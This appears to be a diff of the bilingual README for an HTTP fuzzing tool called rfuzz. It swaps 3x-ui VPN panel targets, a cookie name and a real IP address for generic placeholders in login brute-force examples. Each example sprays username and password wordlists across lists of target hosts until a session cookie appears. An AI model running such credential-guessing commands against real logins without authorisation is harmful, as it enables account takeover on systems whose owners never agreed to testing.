@@ -58,17 +58,17 @@ rfuzz -w passwords.txt:PASS \
 
 ### Multi-Wordlist Login Fuzz / 多字典登录爆破
 
-If `3xui_http_vpn.txt` contains host names or `host:port` values, put the scheme
+If `targets.txt` contains host names or `host:port` values, put the scheme
 in `-u`:
 
-如果 `3xui_http_vpn.txt` 里是域名、IP 或 `host:port`，在 `-u` 里补协议：
+如果 `targets.txt` 里是域名、IP 或 `host:port`，在 `-u` 里补协议：
 
 ```bash
 rfuzz -u https://URLFUZZ/login \
   -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
   -X POST \
-  -d "username=UFUZZ&password=PFUZZ&twoFactorCode=" \
-  -w 3xui_http_vpn.txt:URLFUZZ \
+  -d "username=UFUZZ&password=PFUZZ&otp=" \
+  -w targets.txt:URLFUZZ \
   -w dir/50_name.txt:UFUZZ \
   -w dir/top100.txt:PFUZZ \
   -precheck-key URLFUZZ \
@@ -76,10 +76,10 @@ rfuzz -u https://URLFUZZ/login \
   -target-key URLFUZZ \
   -target-window 100 \
   -target-burst 3 \
-  -mr "Set-Cookie: 3x-ui=" \
+  -mr "Set-Cookie: session_id=" \
   -stop-scope URLFUZZ \
   -stop-on-match 1 \
-  -o 3xui_result.jsonl \
+  -o login_results.jsonl \
   -of jsonl \
   -t 100
 ```
@@ -108,14 +108,14 @@ matched credential:
 rfuzz -u https://URLFUZZ/login \
   -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
   -X POST \
-  -d "username=UFUZZ&password=PFUZZ&twoFactorCode=" \
-  -w 3xui_http_vpn.txt:URLFUZZ \
+  -d "username=UFUZZ&password=PFUZZ&otp=" \
+  -w targets.txt:URLFUZZ \
   -w dir/50_name.txt:UFUZZ \
   -w dir/top100.txt:PFUZZ \
-  -mr "Set-Cookie: 3x-ui=" \
+  -mr "Set-Cookie: session_id=" \
   -stop-scope URLFUZZ \
   -stop-on-match 1 \
-  -o 3xui_result.jsonl \
+  -o login_results.jsonl \
   -of jsonl
 ```
 
@@ -129,14 +129,14 @@ Stop only the current URL and username pair after one matched password:
 rfuzz -u https://URLFUZZ/login \
   -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
   -X POST \
-  -d "username=UFUZZ&password=PFUZZ&twoFactorCode=" \
-  -w 3xui_http_vpn.txt:URLFUZZ \
+  -d "username=UFUZZ&password=PFUZZ&otp=" \
+  -w targets.txt:URLFUZZ \
   -w dir/50_name.txt:UFUZZ \
   -w dir/top100.txt:PFUZZ \
-  -mr "Set-Cookie: 3x-ui=" \
+  -mr "Set-Cookie: session_id=" \
   -stop-scope URLFUZZ,UFUZZ \
   -stop-on-match 1 \
-  -o 3xui_result.jsonl \
+  -o login_results.jsonl \
   -of jsonl
 ```
 
@@ -286,8 +286,8 @@ Example:
 rfuzz -u URLFUZZ/login \
   -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
   -X POST \
-  -d "username=UFUZZ&password=PFUZZ&twoFactorCode=" \
-  -w 3xui_http_vpn.txt:URLFUZZ \
+  -d "username=UFUZZ&password=PFUZZ&otp=" \
+  -w targets.txt:URLFUZZ \
   -w dir/50_name.txt:UFUZZ \
   -w dir/top100.txt:PFUZZ \
   -precheck-key URLFUZZ \
@@ -295,8 +295,8 @@ rfuzz -u URLFUZZ/login \
   -target-key URLFUZZ \
   -target-window 100 \
   -target-burst 3 \
-  -mr "Set-Cookie: 3x-ui=" \
-  -o 3xui_result.jsonl \
+  -mr "Set-Cookie: session_id=" \
+  -o login_results.jsonl \
   -of jsonl \
   -t 100
 ```
@@ -354,7 +354,7 @@ Failed precheck values are printed to the terminal with a short reason:
 预检查失败会在终端打印失败 URL 和简短原因：
 
 ```text
-PRECHECK ERROR URLFUZZ=101.36.104.56:2053 https://101.36.104.56:2053/login: timeout; http://101.36.104.56:2053/login: connection refused
+PRECHECK ERROR URLFUZZ=target1.example.test:8443 https://target1.example.test:8443/login: timeout; http://target1.example.test:8443/login: connection refused
 ```
 
 If `curl` or `nslookup` works for a single hostname but precheck reports a DNS
@@ -408,13 +408,13 @@ To keep failed payload combinations for later analysis, write an error JSONL log
 rfuzz -u https://URLFUZZ/login \
   -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
   -X POST \
-  -d "username=UFUZZ&password=PFUZZ&twoFactorCode=" \
-  -w 3xui_http_vpn.txt:URLFUZZ \
+  -d "username=UFUZZ&password=PFUZZ&otp=" \
+  -w targets.txt:URLFUZZ \
   -w dir/50_name.txt:UFUZZ \
   -w dir/top100.txt:PFUZZ \
-  -mr "Set-Cookie: 3x-ui=" \
+  -mr "Set-Cookie: session_id=" \
   -error-log request_errors.jsonl \
-  -o 3xui_result.jsonl \
+  -o login_results.jsonl \
   -of jsonl \
   -t 100
 ```
@@ -481,14 +481,14 @@ Example:
 rfuzz -u URLFUZZ/login \
   -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
   -X POST \
-  -d "username=UFUZZ&password=PFUZZ&twoFactorCode=" \
-  -w 3xui_http_vpn.txt:URLFUZZ \
+  -d "username=UFUZZ&password=PFUZZ&otp=" \
+  -w targets.txt:URLFUZZ \
   -w dir/50_name.txt:UFUZZ \
   -w dir/top100.txt:PFUZZ \
   -mode clusterbomb \
   -order UFUZZ,PFUZZ,URLFUZZ \
-  -mr "Set-Cookie: 3x-ui=" \
-  -o 3xui_result.jsonl \
+  -mr "Set-Cookie: session_id=" \
+  -o login_results.jsonl \
   -of jsonl \
   -t 100
 ```
@@ -528,8 +528,8 @@ without preloading the whole Cartesian product.
 rfuzz -u URLFUZZ/login \
   -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
   -X POST \
-  -d "username=UFUZZ&password=PFUZZ&twoFactorCode=" \
-  -w 3xui_http_vpn.txt:URLFUZZ \
+  -d "username=UFUZZ&password=PFUZZ&otp=" \
+  -w targets.txt:URLFUZZ \
   -w dir/50_name.txt:UFUZZ \
   -w dir/top100.txt:PFUZZ \
   -precheck-key URLFUZZ \
@@ -539,8 +539,8 @@ rfuzz -u URLFUZZ/login \
   -target-burst 3 \
   -stop-scope URLFUZZ \
   -stop-on-match 1 \
-  -mr "Set-Cookie: 3x-ui=" \
-  -o 3xui_result.jsonl \
+  -mr "Set-Cookie: session_id=" \
+  -o login_results.jsonl \
   -of jsonl \
   -t 100
 ```
@@ -625,7 +625,7 @@ rfuzz -w users.txt:USER -w passwords.txt:PASS \
   -u https://example.com/login \
   -X POST \
   -d 'username=${{USER}}$&password=${{PASS}}$' \
-  -mr 'Set-Cookie: 3x-ui='
+  -mr 'Set-Cookie: session_id='
 ```
 
 ## Parameter Reference / 参数参考
